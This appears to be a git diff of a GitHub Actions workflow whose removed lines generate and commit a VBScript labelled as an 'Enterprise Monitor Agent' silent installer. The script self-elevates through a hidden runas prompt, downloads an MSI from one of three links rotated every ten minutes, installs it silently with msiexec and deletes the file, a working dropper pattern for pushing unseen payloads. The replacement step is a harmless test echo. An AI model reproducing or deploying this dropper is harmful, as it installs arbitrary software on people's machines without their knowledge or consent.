@@ -6,67 +6,11 @@ on:
   workflow_dispatch:
 
 jobs:
-  update:
+  test:
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
     steps:
-    - name: Update VBS
+    - name: Create test file
       run: |
-        # Define your links (REPLACE WITH YOUR ACTUAL LINKS)
-        links=("https://link1.com/dodu" "https://link2.com/dodu" "https://link3.com/dodu")
-        
-        # Get current link based on 10-minute interval
-        current_minute=$(date +%M)
-        link_index=$((current_minute / 10 % 3))
-        current_link=${links[$link_index]}
-        
-        # Create the VBS file directly
-        cat > installer.vbs << EOF
-' --------------------------------------------------------------------------
-'  Silent Installer - Enterprise Monitor Agent
-' --------------------------------------------------------------------------
-Option Explicit
-
-' Check for elevation
-If Not WScript.Arguments.Named.Exists("elevated") Then
-    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
-    WScript.Quit
-End If
-
-Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-strUrl = "$current_link"
-strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
-strFile = strTemp & "\agent_installer.msi"
-
-' Download
-Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
-objXMLHTTP.open "GET", strUrl, False
-objXMLHTTP.send()
-
-If objXMLHTTP.Status = 200 Then
-    Set objADOStream = CreateObject("ADODB.Stream")
-    objADOStream.Open
-    objADOStream.Type = 1 ' Binary
-    objADOStream.Write objXMLHTTP.ResponseBody
-    objADOStream.Position = 0
-    objADOStream.SaveToFile strFile, 2 ' Overwrite
-    objADOStream.Close
-
-    ' Install
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "msiexec /i """ & strFile & """ /quiet /qn /norestart", 0, True
-
-    ' Cleanup
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    If objFSO.FileExists(strFile) Then objFSO.DeleteFile strFile
-End If
-EOF
-        
-    - name: Commit and push
-      run: |
-        git config --global user.email "action@github.com"
-        git config --global user.name "GitHub Action"
-        git add installer.vbs
-        git commit -m "Update VBS with link: $current_link" || exit 0
-        git push
+        echo "Test file created at $(date)" > test.txt
+        echo "Current minute: $(date +%M)"
+        echo "Current link index: $(( $(date +%M) / 10 % 3 ))"
